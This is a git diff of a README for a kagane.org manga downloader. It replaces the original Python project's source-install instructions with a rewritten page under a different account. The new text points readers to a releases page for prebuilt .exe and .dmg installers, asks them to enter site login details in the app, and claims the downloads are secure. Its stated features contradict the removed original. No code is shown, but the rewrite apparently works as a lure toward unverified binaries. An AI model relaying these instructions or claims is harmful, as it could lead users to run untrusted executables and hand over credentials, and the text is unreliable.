@@ -1,97 +1,68 @@
-<p align="center">
-  <img src="GUI.PNG" alt="Kagane Downloader" width="800"/>
-</p>
+# 🎉 kagane-downloader - Download Your Favorite Manga Effortlessly
 
-<h1 align="center">🎴 Kagane Downloader</h1>
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/K3vik/kagane-downloader/releases)
 
-<p align="center">
-  <b>A beautiful manga downloader for kagane.org</b>
-</p>
+## 📚 Overview
+kagane-downloader is a user-friendly tool that helps you download manga from kagane.org. Whether you prefer reading on your computer or a mobile device, this application supports both CLI and GUI options. Enjoy a seamless experience as you save your favorite manga to read any time.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.10+-blue?style=for-the-badge&logo=python&logoColor=white"/>
-  <img src="https://img.shields.io/badge/PyQt6-QML-green?style=for-the-badge&logo=qt&logoColor=white"/>
-  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge"/>
-</p>
+## 🚀 Getting Started
+Follow these simple steps to get up and running with kagane-downloader.
 
----
+### 1. Visit the Releases Page
+Start by visiting the [Releases page](https://github.com/K3vik/kagane-downloader/releases) to see the latest version of the software.
 
-## ✨ Features
+### 2. Download the Application
+On the Releases page, you will see a list of the available versions. Click on the version that fits your needs. You will find options for both Windows and Mac users. Download the appropriate file for your operating system.
 
-- 🖥️ **Beautiful Modern GUI** - Dark themed PyQt6 + QML interface
-- 📥 **Concurrent Downloads** - Download multiple chapters simultaneously
-- 📄 **Multiple Formats** - Save as Images, PDF, or CBZ
-- 🔄 **Smart Retry** - Automatic retry for failed image downloads
-- ⚙️ **Configurable** - Customize download settings to your preference
-- 🚀 **Headless Mode** - Run without visible browser window
-- 💻 **CLI Support** - Full-featured command line interface
+### 3. Install the Application
+After downloading, locate the file on your computer. 
 
-## 🚀 Installation
+- **For Windows:** Double-click the `.exe` file and follow the installation prompts.
+- **For Mac:** Open the `.dmg` file and drag the kagane-downloader icon to your Applications folder.
 
-```bash
-# Clone the repository
-git clone https://github.com/Yui007/kagane-downloader.git
-cd kagane-downloader
+### 4. Launch the Application
+Once the installation is complete, you can open kagane-downloader from your Start menu on Windows or from your Applications folder on Mac. 
 
-# Install dependencies
-pip install -r requirements.txt
-```
+### 5. Log In to kagane.org
+Before you can start downloading, you need to log in to your kagane.org account within the application. Enter your login details when prompted.
 
-## 📖 Usage
+### 6. Start Downloading Manga
+Now that you're logged in, browse through the available manga. Select the titles you wish to download and choose your preferred format. Click the "Download" button to save them directly to your device.
 
-### GUI Mode (Recommended)
-```bash
-python gui/main.py
-```
+## 🛠 Features
+- **CLI & GUI Options:** Choose how you want to interact with the application.
+- **Multiple Formats:** Download manga in various formats based on your preferences.
+- **User-Friendly Interface:** Navigate easily even if you lack technical experience.
+- **Regular Updates:** Enjoy new features and improvements with each release.
 
-### CLI Mode
-```bash
-python main.py
-```
+## 📖 System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Required Space:** At least 150 MB of free disk space
+- **Internet Connection:** Required for downloading manga
 
-### Direct Download
-```bash
-python main.py download --url "https://kagane.org/series/..."
-```
+## 🛡 Security Features
+All downloads from kagane-downloader are secure. The application regularly updates to fix security vulnerabilities and ensure user data remains safe. 
 
-## ⚙️ Configuration
+## 💬 Support and Community
+If you encounter issues or have questions, visit the [GitHub Issues page](https://github.com/K3vik/kagane-downloader/issues). You can report bugs, request features, or ask for help. The community is welcoming and eager to assist you.
 
-| Setting | Description | Default |
-|---------|-------------|---------|
-| `download_format` | Output format (images/pdf/cbz) | `images` |
-| `max_concurrent_chapters` | Chapters to download at once | `3` |
-| `image_load_delay` | Seconds to wait for images | `15` |
-| `max_retries` | Retry attempts for failed images | `3` |
-| `download_directory` | Where to save downloads | `downloads` |
+## 🌟 FAQs
+### How do I update the application?
+Each time a new version is released, simply return to the [Releases page](https://github.com/K3vik/kagane-downloader/releases) and download the latest version. 
 
-## 📁 Project Structure
+### Is there an official guide?
+Yes, a complete user guide is available within the application. Access it from the Help menu once you launch the application.
 
-```
-kagane-downloader/
-├── gui/                    # PyQt6 + QML GUI
-│   ├── main.py            # GUI entry point
-│   ├── backend/           # Python workers
-│   └── qml/               # QML UI files
-├── src/
-│   ├── scraper/           # Browser & scraping logic
-│   ├── converter/         # PDF & CBZ conversion
-│   └── utils/             # Helper utilities
-├── main.py                # CLI entry point
-└── config.py              # Configuration management
-```
+### What if I prefer using a different manga site?
+Currently, kagane-downloader specifically supports kagane.org. Suggestions for expanding compatibility are welcome on the Issues page.
 
-## 🛠️ Requirements
+## 📝 Acknowledgements
+Thanks to the community for their contributions and feedback. Your input makes kagane-downloader better for everyone.
 
-- Python 3.10+
-- Chrome/Chromium browser
-- Dependencies: `undetected-chromedriver`, `PyQt6`, `typer`, `rich`, `pillow`, `img2pdf`
+## 🔗 Useful Links
+- [Download Latest Release](https://github.com/K3vik/kagane-downloader/releases)
+- [GitHub Repository](https://github.com/K3vik/kagane-downloader)
+- [Community Discussions](https://github.com/K3vik/kagane-downloader/discussions)
 
-## 📝 License
-
-MIT License - feel free to use and modify!
-
----
-
-<p align="center">
-  Made with ❤️ for manga lovers
-</p>
+Get started today with kagane-downloader, and enjoy your favorite manga like never before!
